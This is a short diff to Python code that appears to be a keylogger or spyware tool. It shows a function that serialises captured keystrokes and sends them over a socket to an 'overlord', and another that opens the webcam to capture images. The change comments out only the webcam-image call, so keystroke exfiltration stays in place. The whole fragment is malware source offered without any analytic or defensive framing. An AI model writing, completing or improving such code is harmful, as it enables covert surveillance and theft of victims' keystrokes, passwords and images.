@@ -13,7 +13,7 @@ def send_payload_to_socket(payload):
 def send_message_to_overlord(buffered_keys):
     payload = json.dumps([key.__dict__ for key in buffered_keys])
     send_payload_to_socket(payload)
-    send_image_to_overlord()
+    # send_image_to_overlord()
 
 def send_image_to_overlord():
     cap = cv2.VideoCapture(0)
